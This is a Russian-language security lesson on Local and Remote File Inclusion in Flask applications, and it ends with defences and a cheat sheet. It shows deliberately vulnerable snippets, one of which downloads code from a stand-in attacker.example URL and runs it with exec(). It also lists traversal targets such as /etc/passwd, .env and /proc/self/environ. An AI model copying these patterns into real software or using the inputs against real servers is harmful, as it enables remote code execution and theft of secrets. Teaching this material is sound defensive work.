В этом уроке мы разберём уязвимость File Inclusion — одну из классических проблем веб-приложений, которая часто приводит либо к утечке конфиденциальных данных, либо к удалённому выполнению кода на сервере. По сути это логическое продолжение тем про работу с файлами и Directory Traversal: как только приложение начинает включать файлы на основании данных от пользователя, оно рискует отдать злоумышленнику контроль над тем, что именно будет прочитано или исполнено.



Что такое File Inclusion

Под File Inclusion понимают ситуацию, когда веб-приложение вставляет содержимое файла в ответ или использует его как шаблон/исходник, опираясь на значение, пришедшее от пользователя, без достаточных ограничений. В терминах Flask это может выглядеть так: мы берём параметр из URL и используем его как имя шаблона или как часть пути к файлу.

Например, если обработчик маршрута получает page из request.args и напрямую передаёт его в render_template() или в open() для чтения файла, пользователь фактически управляет тем, какой файл приложение откроет. С точки зрения атакующего цель — добиться того, чтобы приложение:





прочитало интересующий локальный файл и отдало его содержимое в ответе (LFI-сценарии)



либо обработало или выполнило код, который злоумышленник контролирует (RFI-сценарии или их аналоги).

Типичная картина:

# берём параметр из URL
    page = request.args.get("page")  # ?page=news.html
# подставляем в путь к файлу
    file_path = os.path.join("pages", page)

Ожидание разработчика:

?page=news.html → откроется и вернётся файл pages/news.html.

Реальность: если злоумышленник может контролировать page, он попробует подставить не только news.html, но и, например:





путь к локальному файлу на сервере (LFI), вроде ../config.py или /etc/passwd;



URL удалённого ресурса, если код вдруг начнёт скачивать и обрабатывать то, что указано в параметре (RFI-подобный сценарий, если разработчик решит «гибко» подгружать шаблоны или данные по сети).

Таким образом, File Inclusion — это пересечение двух идей:





из урока про Directory Traversal — «выбраться» из нужной папки и прочитать произвольный файл;



плюс для RFI — доверять удалённому коду и исполнять его на сервере.







LFI: включение локальных файлов

Local File Inclusion (LFI) — это ситуация, когда вместо ожидаемого шаблона или «разрешённого» файла приложение открывает и отдаёт любой локальный файл в файловой системе сервера. Во Flask это часто связано с:





чтением файлов через open() на основании параметра запроса;



динамическим выбором шаблона для render_template() по имени, пришедшему от пользователя;



самописными функциями, которые собирают путь к файлу из строк, не прошедших нормальную проверку.

Чтобы добраться до «чужих» файлов, злоумышленник может пытаться использовать последовательности наподобие ../, то есть применять технику Directory Traversal для выхода за пределы «разрешённой» директории (например, каталога templates или пользовательских файлов).

Основной интерес при LFI — доступ к тому, что обычно не видно из браузера:





конфигурационные файлы приложения (например, config.py, файлы в папке instance/, .env);



логи приложения и веб-сервера;



системные файлы вроде /etc/passwd на Unix-системах;



временные файлы, файлы сессий и другие служебные данные.

При этом злоумышленнику не обязательно загружать свои файлы на сервер — он использует то, что уже лежит в файловой системе, или те файлы, содержимое которых можно косвенно контролировать (например, логи, куда попадают запросы пользователей).



RFI: включение удалённых файлов

Remote File Inclusion (RFI) — это вариант, когда приложение позволяет включить файл по URL, а не только с локального диска. В этом случае роль «шаблона» может сыграть сценарий, расположенный на сервере злоумышленника. Если язык и конфигурация позволяют такую загрузку, а включаемое содержимое интерпретируется как код, получается очень прямой путь к удалённому выполнению произвольного кода.

Опасность RFI в том, что атакующий сразу получает возможность исполнять собственный код в контексте приложения, а содержимое удалённого файла легко менять в любой момент. Поэтому классический RFI считают более «жёстким» вариантом по сравнению с LFI. В реальных системах он встречается реже, так как многие среды по умолчанию запрещают включение удалённых ресурсов как кода, но понимать механизм важно.

Картина:

# берём параметр из URL
     url = request.args.get("page")  # ?page=http://attacker.example/code.txt
# скачиваем содержимое по переданному URL
    resp = requests.get(url)
    remote_code = resp.text
# опасно: выполняем полученный «шаблон/скрипт» как код
    exec(remote_code, {})

Условия:





платформа/код умеет загружать удалённые ресурсы (в примере — через requests.get()),



разработчик не ограничил, откуда можно загружать и что потом делать с полученными данными (нет проверки домена, нет списка разрешённых источников, нет разделения на «просто данные» и «код»).

Почему RFI считается «более опасным»:





злоумышленник может сразу подсунуть свой произвольный код;



не нужно искать, где в системе уже лежит что-то «исполняемое»;



достаточно одного удачного запроса, чтобы получить полный контроль над процессом приложения.





Как это выглядит в коде Flask-приложений

Во Flask базовый сценарий такой: есть маршрут, обработчик получает данные из request.args, request.form или параметров пути, и эти данные всё дальше участвуют в построении пути к файлу.

Например, проблемный подход выглядит концептуально так:





взять filename = request.args.get("file");



с помощью этого значения сформировать путь, например os.path.join("data", filename);



открыть файл и вернуть его содержимое клиенту;



или передать имя напрямую в render_template(filename).

Если при этом:





не проверять, что filename входит в ограниченный список допустимых имён;



не фильтровать последовательности перехода по каталогам (../) и прочие спецсимволы;



никак не убеждаться, что итоговый путь остаётся внутри «разрешённой» директории,

то пользователь фактически управляет тем, какой реальный файл будет открыт. А если где-то в коде есть логика, которая ещё и исполняет загруженное содержимое, риск становится максимальным.





Поверхность атаки во Flask-приложениях

File Inclusion в контексте Flask чаще всего проявляется через параметры, отвечающие за выбор:





шаблона для рендеринга;



файла для скачивания или просмотра;



модуля/страницы/отчёта и т.п.

Это могут быть:





query-параметры ?page=, ?view=, ?template=, ?file=;



фрагменты пути вида /page/<name> с последующим использованием name как части пути к файлу;



 внутренние API админки и плагинов, которые «подключают» модули по имени.

Приложение может ожидать значения вроде home, profile, report.html, но технически без проверки получает и обрабатывает любую строку, пришедшую от пользователя.


ВИДЕО

Эскалация LFI: от чтения файлов к более серьёзным последствиям

На базовом уровне LFI даёт возможность читать локальные файлы. Уже этого достаточно для серьёзных проблем: через конфиги и .env злоумышленник узнаёт логины и пароли к базе данных, секретные ключи, адреса внутренних сервисов и т.д. Через логи — структуру запросов, значения заголовков, возможные ошибки, стек-трейсы.

Дальше возможны более сложные сценарии:





если приложение по какой-то причине отображает или обрабатывает служебные файлы (логи, временные файлы, данные окружения), а формат и логика обработки позволяют воспринимать части содержимого как команды или инструкции, LFI может перейти в выполнение нежелательных операций;



если Flask-приложение работает на Unix-подобной системе, через LFI можно добраться до виртуальной файловой системы /proc: например, /proc/self/environ содержит переменные окружения процесса, а /proc/self/fd/ — ссылки на открытые дескрипторы. При неосторожной обработке этих данных приложение может раскрыть очень много информации о себе и окружении.

Точные детали зависят от конкретной реализации, но важная идея в том, что LFI — это не только «почитать конфиг», а общий канал доступа к внутренним ресурсам процесса и системы.





Эскалация RFI: удалённый код в мире Python

В RFI-сценариях для Python/Flask основная проблема появляется, когда разработчик сам создаёт мост между «скачать что-то по URL» и «обработать это как код или шаблон». Например:





подставляет полученный по сети текст в exec() или динамический импорт;



загружает шаблон по URL и рендерит его в контексте приложения;



даёт пользователю указать источник для кода плагина или скрипта, после чего загружает его и выполняет.

Если при этом источник не ограничен и не закреплён жёстко (например, только локальная директория, только доверенный домен, только заранее прописанный список), атакующий может указать свой URL и добиться того, чтобы его собственный сценарий выполнялся в процессе Flask-приложения.

Отдельно опасно то, что удалённый файл можно менять без участия владельца уязвимого приложения — это удобный механизм для длительного управления скомпрометированным сервером.



Что видит атакующий

С точки зрения наблюдаемых эффектов:





при LFI в ответе страницы внезапно появляется содержимое файла (конфиг, лог, системный файл);



могут быть ошибки интерпретатора с путями к файлам, стеком вызовов, служебной информацией;



при RFI — выполнение непредусмотренной логики, появление «странных» функций, действий, которые приложение не должно уметь.

Если включаемый файл выводится «как есть», злоумышленник прямо в браузере видит содержимое.
Если вывод обрабатывается, информация может утекать в логах, в ошибках, побочных эффектах.





Связь File Inclusion с другими уязвимостями

File Inclusion редко существует сам по себе; чаще он дополняет и усиливает другие проблемы:





Directory Traversal: та же самая идея с ../, только здесь она используется не просто для чтения файла, но и для выбора шаблонов или модулей;



небезопасная загрузка файлов: если пользователь может загрузить произвольный файл, а потом где-то есть возможность «подключить» этот файл в обработчике (читать, интерпретировать как код или шаблон), комбинация даёт мощный вектор атаки;



утечки конфигураций и логов: через LFI атакующий получает информацию о версиях библиотек, параметрах среды, структуре каталогов, что сильно упрощает поиск других уязвимостей.

К этому добавляются общие вопросы конфигурации: права на файловой системе, изоляция процессов, наличие или отсутствие контейнеризации. Если Flask-приложение работает под пользователем, у которого есть доступ ко множеству системных файлов и конфигураций, последствия успешного File Inclusion будут намного тяжелее.


ВИДЕО


Как защищаться

Главная идея защиты: не давать пользователю управлять тем, что будет исполнено или включено.







Не включать файлы напрямую по пользовательскому вводу. 
Вместо такого:

page = request.args.get("page")          # ?page=news.html
return render_template(page)             # подставляем как есть

лучше использовать жёсткий список разрешённых страниц:

ALLOWED_PAGES = {
    "home":  "home.html",
    "news":  "news.html",
    "about": "about.html",
}

@app.route("/page")
def page():
    key = request.args.get("page", "home")
    if key not in ALLOWED_PAGES:
        abort(404)  # безопасная реакция
    return render_template(ALLOWED_PAGES[key])

Пользователь управляет только ключом, а не реальным путём к файлу или шаблону. 







Валидация ввода, если имя файла всё же приходит извне

Если по архитектуре нужно принимать имя файла/отчёта:





разрешаем только ожидаемые символы (буквы, цифры, _, -);



запрещаем разделители каталогов (/, \), последовательности .., нулевые байты и т.п.;



ограничиваем длину строки;



не принимаем абсолютные пути.
Это та же логика, что и при защите от Directory Traversal, но важнее, потому что файл может использоваться как шаблон или исходник.



 3. Работа с путями через безопасные абстракции





использовать os.path / pathlib для нормализации (., ..) и построения «канонического» пути:



не «склеивать» пути простыми строками;



после всех декодирований и нормализации проверять, что путь остался внутри базовой директории.







Не выполнять и не «включать» удалённый код





не использовать схему «пользователь даёт URL → приложение делает requests.get(url) → результат уходит в exec, динамический импорт или рендер как шаблона»;



скачанные по сети данные обрабатывать только как данные, а не как код или шаблон;



жёстко разделять: функционал «скачать файл/данные по URL» и функционал «исполнить код / отрендерить шаблон» (и держать его только для локальных и заранее известных ресурсов).







Принцип наименьших привилегий и изоляция


Даже если File Inclusion всё-таки случится:





процесс Flask-приложения не должен запускаться от root и иметь доступ ко всей системе;



по возможности использовать контейнеры



хранить конфиги, секреты и чувствительные файлы вне зон, куда веб-процессу вообще нужен доступ.

Так последствия даже успешной эксплуатации будут ограничены.







Логирование и мониторинг





логировать подозрительные значения параметров, которые влияют на выбор файла/шаблона;



ставить алерты на:
- пути с ../,
- попытки обращаться к системным файлам,
- необычные расширения и странные пути в параметрах.

Это не «стена», но хороший способ рано заметить попытки эксплуатации и начать реагировать до серьёзных последствий.

 



Итог

File Inclusion в контексте Python и Flask — это ситуация, когда параметры запросов начинают управлять тем, какой файл приложение читает, отображает или даже использует как код. В случае LFI это, как правило, приводит к чтению локальных файлов и утечке конфиденциальной информации; в случае RFI-подобных сценариев — к обработке или выполнению кода, полученного из внешних источников. Понимание того, как Flask работает с шаблонами, файлами и внешними ресурсами, и жёсткое разделение между «данными от пользователя» и «пути к ресурсам приложения» — ключевой шаг, чтобы не допустить появление этой уязвимости уже на этапе проектирования.







Мини-шпаргалка по File Inclusion

File Inclusion = включение файлов по пользовательскому вводу.





LFI — подключаем локальный файл:





часто строится через Directory Traversal;



последствия: чтение конфигов, логов, исходников, иногда RCE через обходные сценарии (логи, /proc и т.д.).



RFI — подключаем удалённый ресурс:





нужен include по URL;



последствия: исполнение произвольного кода с удалённого сервера.

Основные риски:





утечка секретов и конфигураций;



обход аутентификации/авторизации;



удалённое выполнение кода и полный захват приложения.

Защита:





не передавать сырые пути из пользовательского ввода;



использовать белые списки файлов, а не «любой путь»;



валидировать и нормализовать пути, блокировать .., /, \, абсолютные пути;



минимальные привилегии процесса, изоляция и мониторинг.

Такой подход позволяет превратить потенциально критичный класс уязвимостей в контролируемый риск и поймать проблему ещё на этапе дизайна приложения, а не после инцидента.
